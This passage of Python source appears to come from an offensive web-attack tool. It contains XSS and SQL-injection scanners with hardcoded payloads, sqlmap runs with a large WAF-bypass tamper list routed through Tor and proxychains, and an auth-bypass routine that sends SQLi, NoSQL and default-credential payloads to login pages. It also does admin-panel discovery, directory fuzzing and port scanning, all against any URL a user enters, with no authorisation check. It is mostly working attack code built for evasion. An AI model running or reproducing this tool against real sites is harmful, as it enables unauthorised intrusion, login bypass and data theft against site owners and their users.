                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='ignore')
                decoded_payload = urllib.parse.unquote(payload)
                if decoded_payload in body:
                    vulnerable.append((key, payload, "Reflected"))
                    print_good(f"XSS found in '{key}' - Payload reflected directly")
                    break
                elif payload in body:
                    vulnerable.append((key, payload, "Reflected (encoded)"))
                    print_good(f"XSS found in '{key}' - Payload reflected (encoded form)")
                    break
                else:
                    sanitized_checks = [
                        decoded_payload.replace("<", "&lt;").replace(">", "&gt;"),
                        decoded_payload.replace("<script>", "").replace("</script>", ""),
                        decoded_payload.lower(),
                    ]
                    for check in sanitized_checks:
                        if check in body.lower() and len(check) > 5:
                            print_warn(f"Partial reflection in '{key}' - may be sanitized")
                            break
            except urllib.error.HTTPError as e:
                if e.code == 200:
                    try:
                        body = e.read().decode('utf-8', errors='ignore')
                        decoded_payload = urllib.parse.unquote(payload)
                        if decoded_payload in body or payload in body:
                            vulnerable.append((key, payload, "Reflected (200 error)"))
                            print_good(f"XSS found in '{key}' - Payload reflected")
                            break
                    except:
                        pass
            except:
                continue
        if not any(v[0] == key for v in vulnerable):
            print_info(f"Parameter '{key}' appears not vulnerable to XSS")
    if vulnerable:
        print_section(" XSS Results ")
        for v in vulnerable:
            print_good(f"Parameter: {v[0]}, Payload: {v[1][:50]}, Type: {v[2]}")
    return vulnerable

# ============================================================
# SQL INJECTION SCAN (Enhanced)
# ============================================================

def sql_injection_scan(url):
    print_section(" SQL Injection Scan ")
    if "?" not in url:
        print_warn("No parameters to test for SQL injection")
        return []
    base_url = url.split("?")[0]
    params_part = url.split("?")[1] if "?" in url else ""
    params = params_part.split("&") if params_part else []
    vulnerable = []
    for param in params:
        key = param.split("=")[0] if "=" in param else param
        print_info(f"Testing parameter: {key}")
        for payload in WAF_BYPASS_PAYLOADS_SQLI[:15]:
            test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=10)
                body = resp.read().decode('utf-8', errors='ignore')
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        vulnerable.append((key, payload, pattern))
                        print_good(f"SQL Injection found in '{key}' with payload: {payload[:40]}")
                        break
                if vulnerable:
                    break
            except urllib.error.HTTPError as e:
                if e.code == 200:
                    try:
                        body = e.read().decode('utf-8', errors='ignore')
                        for pattern in SQL_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                vulnerable.append((key, payload, pattern))
                                break
                    except:
                        pass
                elif e.code not in [403, 406, 429, 503]:
                    pass
            except:
                continue
        if not any(v[0] == key for v in vulnerable):
            print_info(f"Parameter '{key}' appears not vulnerable to SQL injection")
    if vulnerable:
        print_section(" SQL Injection Results ")
        for v in vulnerable:
            print_good(f"Parameter: {v[0]}, Payload: {v[1]}, Error: {v[2]}")
    else:
        print_warn("No SQL injection vulnerabilities detected")
    return vulnerable

# ============================================================
# AUTO SQLI SCAN (Error + Time + Boolean)
# ============================================================

def auto_sqli_scan(url):
    print_section(" Automatic SQL Injection Scan ")
    if "?" not in url:
        print_warn("No parameters to test for SQL injection")
        return [], None
    base_url = url.split("?")[0]
    params_part = url.split("?")[1]
    params = params_part.split("&") if params_part else []
    all_vulnerable = []
    # Phase 1: Error-based
    print_info("Phase 1: Error-based detection...")
    error_results = sql_injection_scan(url)
    if error_results:
        all_vulnerable.extend(error_results)
    # Phase 2: Time-based blind
    if not all_vulnerable:
        print_info("Phase 2: Time-based blind detection...")
        for param in params:
            key = param.split("=")[0] if "=" in param else param
            time_payloads = [
                f"1' AND SLEEP(4)-- -",
                f"1' AND BENCHMARK(5000000,MD5('test'))-- -",
                f"1' WAITFOR DELAY '0:0:4'-- -",
                f"1' OR SLEEP(4)-- -",
                f"1' AND pg_sleep(4)-- -",
            ]
            for payload in time_payloads:
                test_url = f"{base_url}?{key}={urllib.parse.quote(payload)}"
                start = time.time()
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
                    resp = urllib.request.urlopen(req, timeout=20)
                    elapsed = time.time() - start
                    if elapsed > 3.5:
                        all_vulnerable.append((key, payload, f"Time-based ({elapsed:.2f}s)"))
                        print_good(f"Time-based SQLi found in '{key}' ({elapsed:.2f}s)")
                        break
                except:
                    continue
    # Phase 3: Boolean-based
    if not all_vulnerable:
        print_info("Phase 3: Boolean-based detection...")
        for param in params:
            key = param.split("=")[0] if "=" in param else param
            true_url = f"{base_url}?{key}=1' AND 1=1-- -"
            false_url = f"{base_url}?{key}=1' AND 1=2-- -"
            try:
                req_true = urllib.request.Request(true_url, headers={"User-Agent": get_random_ua()})
                resp_true = urllib.request.urlopen(req_true, timeout=10)
                body_true = resp_true.read().decode('utf-8', errors='ignore')
                len_true = len(body_true)
                req_false = urllib.request.Request(false_url, headers={"User-Agent": get_random_ua()})
                resp_false = urllib.request.urlopen(req_false, timeout=10)
                body_false = resp_false.read().decode('utf-8', errors='ignore')
                len_false = len(body_false)
                if abs(len_true - len_false) > 50:
                    all_vulnerable.append((key, "Boolean Blind", f"Length diff: {len_true} vs {len_false}"))
                    print_good(f"Boolean-based SQLi found in '{key}'")
                    break
            except:
                continue
    # Phase 4: Column detection (descending)
    max_cols, vuln_params = detect_columns_fixed(url)
    vuln_cols = None
    if max_cols and vuln_params:
        vuln_cols = find_vulnerable_columns(url, max_cols, vuln_params)
    return all_vulnerable, vuln_cols

# ============================================================
# SQLMAP WITH AUTO BYPASS
# ============================================================

def auto_sqlmap_with_bypass(url):
    print_section(" SQLMap Auto (WAF Bypass + Low Reset) ")
    sqlmap_path = shutil.which("sqlmap")
    if not sqlmap_path:
        common_paths = [
            os.path.expanduser("~/sqlmap/sqlmap.py"),
            "/usr/share/sqlmap/sqlmap.py",
            "/opt/sqlmap/sqlmap.py",
            "/data/data/com.termux/files/home/sqlmap/sqlmap.py"
        ]
        for sp in common_paths:
            if os.path.exists(sp):
                sqlmap_path = sp
                break
    if not sqlmap_path:
        print_error("sqlmap not found!")
        print_info("Install: apt install sqlmap")
        return
    bypass_success, bypass_method = auto_waf_bypass(url)
    if bypass_success:
        print_good(f"WAF bypass available: {bypass_method}")
    if not check_tor_status():
        print_warn("Tor not running! Attempting to start...")
        start_tor()
    cmd = [
        sqlmap_path, "-u", url, "--batch", "--random-agent",
        "--level=3", "--risk=2", "--threads=2", "--time-sec=3",
        "--retries=10", "--delay=1", "--flush-session", "--fresh-queries",
        "--smart", "--skip-waf", "--disable-coloring",
        "--tamper=between,randomcase,space2comment,space2plus,space2dash,space2mssqlblank,space2mysqlblank,apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,escapequotes,greatest,halfversionedmorekeywords,ifnull2ifisnull,informationschemacomment,inlinequery,integration,least,lowercase,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,overlongutf8,percentage,randomcase,randomcomments,securesphere,sp_password,space2comment,space2dash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,symboliclogical,unionalltounion,unmagicquotes,uppercase,varnish,vbkeyword,versionedkeywords,versionedmorekeywords,xforwardedfor"
    ]
    if TOR_RUNNING:
        cmd.extend(["--tor", "--tor-type=SOCKS5", "--tor-port=9050"])
        print_good("Tor integration enabled")
    check_proxychains()
    if PROXYCHAINS_AVAILABLE:
        cmd = get_proxychains_cmd() + cmd
        print_good("Proxychains enabled")
    print_info(f"Running sqlmap with full WAF bypass...")
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
        for line in iter(process.stdout.readline, ""):
            line = line.strip()
            if not line:
                continue
            if "connection reset" in line.lower():
                print_warn(f"sqlmap: Connection reset - retrying...")
            elif "CRITICAL" in line and "connection reset" not in line.lower():
                print_error(f"sqlmap: {line}")
            elif "WARNING" in line and "pre-connect" not in line.lower():
                print_warn(f"sqlmap: {line}")
            elif "SUCCESS" in line or "identified" in line.lower() or "database" in line.lower():
                print_good(f"sqlmap: {line}")
            elif "INFO" in line:
                print_info(f"sqlmap: {line}")
            else:
                print(f"  {line}")
        process.wait()
        if process.returncode == 0:
            print_good("sqlmap completed successfully!")
        else:
            print_warn(f"sqlmap exited with code {process.returncode}")
    except Exception as e:
        print_error(f"Error: {e}")

# ============================================================
# CMS AUTO DETECTION + WORDPRESS SCAN
# ============================================================

def auto_cms_scan(url):
    print_section(" CMS Auto Scan ")
    base_url = f"{url.rstrip('/')}"
    if "?" in url:
        base_url = url.split("?")[0].rstrip("/")
    parsed = urllib.parse.urlparse(url)
    domain_base = f"{parsed.scheme}://{parsed.netloc}"
    cms_detected = None
    cms_info = {}
    wp_paths = [
        "/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/",
        "/wp-json/", "/xmlrpc.php", "/wp-config.php.bak", "/wp-config.php~",
        "/wp-content/plugins/", "/wp-content/themes/", "/wp-admin/admin-ajax.php",
        "/readme.html", "/license.txt", "/wp-cron.php", "/wp-links-opml.php"
    ]
    joomla_paths = [
        "/administrator/", "/components/", "/modules/", "/templates/",
        "/language/", "/plugins/", "/cache/", "/tmp/",
        "/configuration.php", "/htaccess.txt", "/robots.txt"
    ]
    drupal_paths = [
        "/user/login", "/node/1", "/sites/default/",
        "/core/", "/modules/", "/themes/",
        "/CHANGELOG.txt", "/README.txt", "/cron.php"
    ]
    print_info("Checking for WordPress...")
    wp_markers = 0
    for path in wp_paths:
        test_url = domain_base + path
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            if resp.getcode() in [200, 301, 302, 403]:
                wp_markers += 1
                if wp_markers >= 2:
                    cms_detected = "WordPress"
                    cms_info["version"] = ""
                    cms_info["paths"] = []
                    print_good("WordPress CMS detected!")
                    break
        except:
            continue
    if not cms_detected:
        print_info("Checking for Joomla...")
        joomla_markers = 0
        for path in joomla_paths:
            try:
                req = urllib.request.Request(domain_base + path, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=8)
                if resp.getcode() in [200, 301, 302, 403]:
                    joomla_markers += 1
                    if joomla_markers >= 2:
                        cms_detected = "Joomla"
                        print_good("Joomla CMS detected!")
                        break
            except:
                continue
    if not cms_detected:
        print_info("Checking for Drupal...")
        drupal_markers = 0
        for path in drupal_paths:
            try:
                req = urllib.request.Request(domain_base + path, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=8)
                if resp.getcode() in [200, 301, 302, 403]:
                    drupal_markers += 1
                    if drupal_markers >= 2:
                        cms_detected = "Drupal"
                        print_good("Drupal CMS detected!")
                        break
            except:
                continue
    if not cms_detected:
        print_info("No known CMS detected")
        return None
    if cms_detected == "WordPress":
        print_section(" WordPress Auto Scan ")
        wp_findings = []
        # Check wp-admin
        try:
            req = urllib.request.Request(domain_base + "/wp-admin/", headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            if resp.getcode() in [200, 302]:
                print_good(f"wp-admin accessible: {domain_base}/wp-admin/")
                wp_findings.append(("Admin Panel", domain_base + "/wp-admin/", "Accessible"))
        except urllib.error.HTTPError as e:
            if e.code == 401:
                print_warn(f"wp-admin requires auth: {domain_base}/wp-admin/")
                wp_findings.append(("Admin Panel", domain_base + "/wp-admin/", "Auth Required"))
        # Check XML-RPC
        try:
            req = urllib.request.Request(domain_base + "/xmlrpc.php", headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            print_warn(f"XML-RPC enabled: {domain_base}/xmlrpc.php")
            wp_findings.append(("XML-RPC", domain_base + "/xmlrpc.php", "Enabled"))
        except:
            pass
        # Check user enumeration
        for u_url in [domain_base + "/wp-json/wp/v2/users", domain_base + "/?author=1"]:
            try:
                req = urllib.request.Request(u_url, headers={"User-Agent": get_random_ua()})
                resp = urllib.request.urlopen(req, timeout=8)
                body = resp.read().decode('utf-8', errors='ignore')
                if "name" in body and "slug" in body:
                    print_warn(f"User enumeration possible: {u_url}")
                    wp_findings.append(("User Enum", u_url, "Possible"))
                    break
            except:
                continue
        # Check version
        try:
            req = urllib.request.Request(domain_base, headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            body = resp.read().decode('utf-8', errors='ignore')
            match = re.search(r'<meta name="generator" content="WordPress ([0-9.]+)"', body)
            if match:
                print_info(f"WordPress version: {match.group(1)}")
        except:
            pass
        # Check debug.log
        try:
            req = urllib.request.Request(domain_base + "/wp-content/debug.log", headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            if resp.getcode() == 200:
                print_warn(f"Debug log exposed: {domain_base}/wp-content/debug.log")
                wp_findings.append(("Debug Log", domain_base + "/wp-content/debug.log", "Exposed"))
        except:
            pass
    return cms_detected

# ============================================================
# NIKTO AUTO SCAN
# ============================================================

def auto_nikto_scan(url):
    print_section(" Nikto Auto Scan ")
    nikto_path = shutil.which("nikto")
    if not nikto_path:
        print_warn("nikto not found. Install: apt install nikto")
        return False
    print_info("Running nikto scan (may take a few minutes)...")
    cmd = [nikto_path, "-h", url, "-ssl", "-nointeractive", "-Tuning", "123456789"]
    check_tor_status()
    check_proxychains()
    if TOR_RUNNING and PROXYCHAINS_AVAILABLE:
        cmd = get_proxychains_cmd() + cmd
        print_good("Routing nikto through Tor + proxychains")
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
        findings = []
        for line in iter(process.stdout.readline, ""):
            line = line.strip()
            if not line:
                continue
            if "+" in line and ":" in line:
                findings.append(line)
                if "OSVDB" in line or "vulnerabilit" in line.lower() or "CVE" in line:
                    print_error(f"nikto: {line}")
                elif "INFO" in line.upper():
                    print_info(f"nikto: {line}")
                else:
                    print_warn(f"nikto: {line}")
        process.wait()
        if findings:
            print_good(f"nikto found {len(findings)} items")
        else:
            print_info("nikto completed - no significant findings")
        return True
    except Exception as e:
        print_error(f"nikto failed: {e}")
        return False

# ============================================================
# ADMIN PANEL FINDER (FIXED - no false positives)
# ============================================================

def find_admin_panel(url):
    print_section(" Admin Panel Finder ")
    base_url = f"{url.rstrip('/')}"
    if "?" in url:
        base_url = url.split("?")[0].rstrip("/")
    parsed = urllib.parse.urlparse(url)
    domain_base = f"{parsed.scheme}://{parsed.netloc}"
    admin_found = []
    
    # Keywords that indicate a real admin/login page (even on 403/401)
    ADMIN_KEYWORDS = ["login", "password", "username", "dashboard", "admin", "control panel", "cpanel", "plesk", "directadmin"]
    # Paths that are almost always false positives (generic server status)
    FP_PATHS = ["/server-status", "/server-info", "/status", "/info"]
    
    print_info(f"Searching {len(ADMIN_PATHS)} admin paths...")
    for path in ADMIN_PATHS:
        test_url = domain_base + path
        status, headers, body = get_response(test_url, timeout=6)
        
        # Skip 404 and non-existent
        if status == 404 or status is None:
            continue
        
        # For 403 or 401, we need to look inside the body to see if it's an actual admin page
        if status in [403, 401]:
            # If it's a known false‑positive path, skip
            if path in FP_PATHS:
                continue
            # Check if body contains any admin keywords
            if any(kw in body.lower() for kw in ADMIN_KEYWORDS):
                admin_found.append((test_url, f"Accessible (HTTP {status} - admin keywords found)"))
                print_good(f"Admin path found: {test_url} (HTTP {status} - contains admin keywords)")
            else:
                # It's likely a generic forbidden page – skip
                print_info(f"Skipping {test_url} (HTTP {status} - no admin keywords)")
            continue
        
        # For 200, check content
        if status == 200:
            if "login" in body.lower() or "password" in body.lower() or "username" in body.lower():
                admin_found.append((test_url, "Login Page"))
                print_good(f"Admin login found: {test_url}")
            elif "dashboard" in body.lower() or "admin" in body.lower():
                admin_found.append((test_url, "Dashboard"))
                print_good(f"Admin dashboard: {test_url}")
            else:
                # Generic 200 without admin indicators – likely not a panel
                admin_found.append((test_url, f"Accessible (HTTP {status} - no admin indicators)"))
                print_info(f"Found page: {test_url} (HTTP {status}) - not clearly admin")
            continue
        
        # For 301/302 redirects, we'll trust them as they usually point to real login
        if status in [301, 302]:
            admin_found.append((test_url, "Redirect"))
            print_good(f"Admin redirect found: {test_url}")
            continue
        
        # For other statuses, skip
        continue
    
    if admin_found:
        print_section(" Admin Panel Results ")
        for url_found, atype in admin_found:
            print(f"  {GREEN}[{atype}]{NC} {url_found}")
    else:
        print_warn("No admin panels found")
    return admin_found

# ============================================================
# AUTO AUTH BYPASS
# ============================================================

def auto_auth_bypass(url):
    print_section(" Auth Bypass Attempts ")
    parsed = urllib.parse.urlparse(url)
    domain_base = f"{parsed.scheme}://{parsed.netloc}"
    login_urls = []
    for path in ["/admin", "/login", "/wp-login.php", "/administrator",
                 "/user/login", "/signin", "/auth", "/cms/login"]:
        test_url = domain_base + path
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=8)
            body = resp.read().decode('utf-8', errors='ignore')
            if "password" in body.lower() or "login" in body.lower() or "username" in body.lower():
                login_urls.append(test_url)
        except:
            continue
    if not login_urls:
        login_urls = [url]
    print_info(f"Testing {len(login_urls)} login pages for auth bypass...")
    bypass_payloads = [
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        {"username": "admin' -- -", "password": "anything"},
        {"username": "admin' #", "password": "anything"},
        {"username": "' UNION SELECT 1,1,1 -- -", "password": "anything"},
        {"username": "admin' OR 1=1 -- -", "password": "anything"},
        {"username": "\" OR \"1\"=\"1", "password": "\" OR \"1\"=\"1"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "12345"},
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": "admin123"},
        {"username": "root", "password": "root"},
        {"username": "root", "password": "toor"},
        {"username": "test", "password": "test"},
        {"username": "guest", "password": "guest"},
        {"username": "user", "password": "user"},
        {"username": "administrator", "password": "administrator"},
        {"username": '{"$gt": ""}', "password": '{"$gt": ""}'},
        {"username": '{"$ne": ""}', "password": '{"$ne": ""}'},
        {"username": "admin", "password": "true"},
        {"username": "admin", "password": "1"},
        {"username": "../../../etc/passwd", "password": "anything"},
    ]
    for login_url in login_urls:
        print_info(f"Testing: {login_url}")
        for payload in bypass_payloads:
            try:
                data = urllib.parse.urlencode(payload).encode()
                req = urllib.request.Request(
                    login_url, data=data,
                    headers={"User-Agent": get_random_ua(), "Content-Type": "application/x-www-form-urlencoded"}
                )
                resp = urllib.request.urlopen(req, timeout=10)
                if resp.getcode() == 200:
                    body = resp.read().decode('utf-8', errors='ignore').lower()
                    success_indicators = ["dashboard", "welcome", "logout", "logged in", "session", "profile", "admin panel"]
                    fail_indicators = ["invalid", "incorrect", "wrong", "failed", "error", "try again"]
                    has_success = any(ind in body for ind in success_indicators)
                    has_fail = any(ind in body for ind in fail_indicators)
                    if has_success and not has_fail:
                        print_good(f"AUTH BYPASS SUCCESSFUL! URL: {login_url}, User: {payload['username']}, Pass: {payload['password']}")
                        return True, login_url, payload
            except urllib.error.HTTPError as e:
                if e.code in [302, 301]:
                    print_good(f"Auth bypass possible (HTTP {e.code} redirect) - URL: {login_url}")
                    return True, login_url, payload
            except:
                continue
    print_warn("No auth bypass found")
    return False, None, None

# ============================================================
# WEB CRAWLING
# ============================================================

def web_crawl(url, max_pages=50):
    print_section(" Web Crawling ")
    print_info(f"Crawling {url} (max {max_pages} pages)...")
    visited = set()
    to_visit = [url]
    found_urls = []
    while to_visit and len(visited) < max_pages:
        current = to_visit.pop(0)
        if current in visited:
            continue
        visited.add(current)
        try:
            req = urllib.request.Request(current, headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode('utf-8', errors='ignore')
            found_urls.append(current)
            print_info(f"Crawled: {current}")
            links = re.findall(r'href=[\'"]?(/[^\'" >]+)', body)
            parsed = urllib.parse.urlparse(current)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for link in links:
                if link.startswith('/'):
                    full_url = base + link
                elif link.startswith('http'):
                    full_url = link
                else:
                    continue
                if full_url not in visited and len(visited) < max_pages:
                    to_visit.append(full_url)
        except:
            continue
    print_good(f"Crawled {len(found_urls)} pages")
    return found_urls

# ============================================================
# DIRECTORY FUZZING (using get_response)
# ============================================================

def fuzz_directories(url):
    print_section(" Directory Fuzzing ")
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    print_info(f"Fuzzing {base} with {len(FUZZ_WORDLIST)} paths...")
    found = []
    for path in FUZZ_WORDLIST:
        test_url = f"{base}/{path}"
        status, headers, body = get_response(test_url, timeout=5)
        if status in [200, 301, 302, 403]:
            found.append((test_url, status))
            print_good(f"Found: {test_url} (HTTP {status})")
    print_good(f"Found {len(found)} directories")
    return found

# ============================================================
# PORT SCANNING
# ============================================================

def scan_ports(url, ports=None):
    print_section(" Port Scanning ")
    if not ports:
        ports = COMMON_PORTS
    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc.split(':')[0] if ':' in parsed.netloc else parsed.netloc
    print_info(f"Scanning {host} for {len(ports)} common ports...")
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                open_ports.append(port)
                print_good(f"Port {port} open")
        except:
            continue
    print_good(f"Found {len(open_ports)} open ports")
    return open_ports

# ============================================================
# HEADER ANALYSIS
# ============================================================

def analyze_headers(url):
    print_section(" Header Analysis ")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=10)
        headers = dict(resp.headers)
        print_info(f"Server: {headers.get('Server', 'Unknown')}")
        print_info(f"Content-Type: {headers.get('Content-Type', 'Unknown')}")
        if 'X-Powered-By' in headers:
            print_info(f"X-Powered-By: {headers['X-Powered-By']}")
        if 'Set-Cookie' in headers:
            print_warn("Cookies are being set")
        if 'X-Frame-Options' not in headers:
            print_warn("X-Frame-Options header missing - possible clickjacking")
        if 'X-XSS-Protection' not in headers:
            print_warn("X-XSS-Protection header missing")
        if 'Strict-Transport-Security' not in headers:
            print_warn("HSTS header missing")
        return headers
    except Exception as e:
        print_error(f"Error analyzing headers: {e}")
        return {}

# ============================================================
# SSL/TLS CHECK
# ============================================================

def check_ssl(url):
    print_section(" SSL/TLS Check ")
    if not url.startswith("https"):
        print_warn("Target does not use HTTPS")
        return False
    parsed = urllib.parse.urlparse(url)
    host = parsed.netloc.split(':')[0] if ':' in parsed.netloc else parsed.netloc
    try:
        context = ssl.create_default_context()
        sock = socket.create_connection((host, 443), timeout=10)
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            cert = ssock.getpeercert()
            print_good(f"SSL Certificate found for: {host}")
            print_info(f"Subject: {cert.get('subject', [])}")
            print_info(f"Valid from: {cert.get('notBefore', 'Unknown')}")
            print_info(f"Valid to: {cert.get('notAfter', 'Unknown')}")
            print_info(f"SSL Version: {ssock.version()}")
            return True
    except Exception as e:
        print_error(f"SSL/TLS check failed: {e}")
        return False

# ============================================================
# TECHNOLOGY DETECTION
# ============================================================

def detect_technologies(url):
    print_section(" Technology Detection ")
    techs = []
    try:
        req = urllib.request.Request(url, headers={"User-Agent": get_random_ua()})
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode('utf-8', errors='ignore')
        headers = dict(resp.headers)
        if 'Server' in headers:
            techs.append(f"Server: {headers['Server']}")
        if 'X-Powered-By' in headers:
            techs.append(f"X-Powered-By: {headers['X-Powered-By']}")
        if 'wp-content' in body or 'wp-admin' in body:
            techs.append("WordPress")
        if 'Joomla' in body or 'joomla' in body:
            techs.append("Joomla")
        if 'Drupal' in body:
            techs.append("Drupal")
        if 'jQuery' in body:
            techs.append("jQuery")
        if 'Bootstrap' in body:
            techs.append("Bootstrap")
        if 'react' in body.lower():
            techs.append("ReactJS")
        if 'vue' in body.lower():
            techs.append("VueJS")
        if 'angular' in body.lower():
            techs.append("Angular")
        for tech in techs:
            print_good(f"Detected: {tech}")
    except Exception as e:
        print_error(f"Technology detection failed: {e}")
    return techs

# ============================================================
# ROBOTS/SITEMAP CHECK
# ============================================================

def check_robots_sitemap(url):
    print_section(" Robots & Sitemap Check ")
    parsed = urllib.parse.urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for path in ["/robots.txt", "/sitemap.xml", "/sitemap_index.xml"]:
        test_url = base + path
        try:
            req = urllib.request.Request(test_url, headers={"User-Agent": get_random_ua()})
            resp = urllib.request.urlopen(req, timeout=10)
            if resp.getcode() == 200:
                print_good(f"Found: {test_url}")
                content = resp.read().decode('utf-8', errors='ignore')[:500]
                print_info(f"Content: {content[:200]}...")
        except:
            continue

# ============================================================
# FULLY AUTOMATIC SCAN v2.0
# ============================================================

def run_auto_scan(url):
    show_banner()
    print()
    print(f"{GREEN}Target URL: {url}{NC}")
    print(f"{GREEN}Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{NC}")
    print(f"{GREEN}Mode: FULLY AUTOMATIC v2.0{NC}")
    print()
    check_install_requirements()
    print_section(" Target Status ")
    status = is_url_alive(url)
    if not status:
        print_error("Target is not reachable!")
        return
    print_good(f"Target is alive (HTTP {status})")
    waf_detected = detect_waf(url)
    bypass_method = None
    if waf_detected:
        print_info(f"WAF detected: {', '.join(waf_detected)}")
        print_info("Running auto WAF bypass...")
        bypass_success, bypass_method = auto_waf_bypass(url)
        if bypass_success:
            print_good(f"WAF bypassed using: {bypass_method}")
        else:
            print_warn("Continuing without WAF bypass")
    techs = detect_technologies(url)
    analyze_headers(url)
    if url.startswith("https"):
        check_ssl(url)
    check_robots_sitemap(url)
    cms_type = auto_cms_scan(url)
    admin_panels = find_admin_panel(url)
    if admin_panels:
        for admin_url, _ in admin_panels[:3]:
            if "login" in admin_url.lower() or "auth" in admin_url.lower() or "Auth Required" in _:
                bypass_found, bypass_url, bypass_creds = auto_auth_bypass(admin_url)
                if bypass_found:
                    print_good(f"Auth bypass working for {admin_url}")
    crawled_urls = web_crawl(url)
    fuzz_directories(url)
    open_ports = scan_ports(url)
    sqli_results, vuln_cols = auto_sqli_scan(url)
    xss_results = xss_scan_fixed(url)
    if "?" in url:
        print_section(" SQLMap Integration ")
        print(f"{YELLOW}Run sqlmap automatically?{NC}")
        print(f"  {GREEN}[1]{NC} Yes - with WAF bypass + Tor")
        print(f"  {GREEN}[2]{NC} Yes - standard mode")
        print(f"  {GREEN}[3]{NC} Skip")
        choice = input(f"{YELLOW}[?] Option (1-3): {NC}").strip()
        if choice == "1":
            auto_sqlmap_with_bypass(url)
        elif choice == "2":
            auto_sqlmap_with_bypass(url)
    print_section(" Nikto Integration ")
    print(f"{YELLOW}Run nikto web scanner?{NC}")
    print(f"  {GREEN}[1]{NC} Yes")
    print(f"  {GREEN}[2]{NC} Skip")
    if input(f"{YELLOW}[?] Option (1-2): {NC}").strip() == "1":
        auto_nikto_scan(url)
    print_section(" Scan Summary ")
    print(f"  Target: {url}")
    print(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  CMS Detected: {cms_type if cms_type else 'None'}")
    print(f"  WAF Detected: {', '.join(waf_detected) if waf_detected else 'None'}")
    print(f"  WAF Bypassed: {bypass_method if bypass_method else 'N/A'}")
    print(f"  Admin Panels: {len(admin_panels) if admin_panels else 0}")
    print(f"  SQL Injection: {len(sqli_results) if sqli_results else 0} vulns")
    print(f"  Vulnerable Columns: {vuln_cols if vuln_cols else 'Not found'}")
    print(f"  XSS: {len(xss_results) if xss_results else 0} vulns")
    print(f"  Open Ports: {len(open_ports) if open_ports else 0}")
    print(f"  URLs Crawled: {len(crawled_urls) if crawled_urls else 0}")
    print()
    print(f"{GREEN}{BOLD}Scan completed successfully!{NC}")

# ============================================================
# INTERACTIVE MENU
# ============================================================

def interactive_menu():
    while True:
        show_banner()
        print(f"{CYAN}Options:{NC}")
        print(f"  {GREEN}[1]{NC} FULLY AUTOMATIC SCAN (All Modules)")
        print(f"  {GREEN}[2]{NC} WAF Detection + Auto Bypass")
        print(f"  {GREEN}[3]{NC} SQL Injection (Auto + Column Detect)")
        print(f"  {GREEN}[4]{NC} XSS Scan (Fixed)")
        print(f"  {GREEN}[5]{NC} CMS Detection + WordPress Auto Scan")
        print(f"  {GREEN}[6]{NC} Admin Panel Finder + Auth Bypass")
        print(f"  {GREEN}[7]{NC} Web Crawling")
        print(f"  {GREEN}[8]{NC} Port Scanning")
        print(f"  {GREEN}[9]{NC} Directory Fuzzing")
        print(f"  {GREEN}[10]{NC} Header Analysis")
        print(f"  {GREEN}[11]{NC} SSL/TLS Check (Fixed)")
        print(f"  {GREEN}[12]{NC} SQLMap WAF Bypass Edition")
        print(f"  {GREEN}[13]{NC} Nikto Scanner")
        print(f"  {GREEN}[14]{NC} Vulnerable Column Finder")
        print(f"  {RED}[0]{NC} Exit")
        print()
        choice = input(f"{YELLOW}[?] Option (0-14): {NC}").strip()
        if choice == "0":
            print(f"{GREEN}Exiting...{NC}")
            sys.exit(0)
        url = input(f"{YELLOW}[?] Enter target URL: {NC}").strip()
        if not url:
            print_error("URL is required!")
            continue
        if not url.startswith("http"):
            url = "http://" + url
        show_banner()
        print(f"{GREEN}Target: {url}{NC}\n")
        try:
            if choice == "1":
                run_auto_scan(url)
            elif choice == "2":
                check_install_requirements()
                detect_waf(url)
                auto_waf_bypass(url)
            elif choice == "3":
                auto_sqli_scan(url)
            elif choice == "4":
                xss_scan_fixed(url)
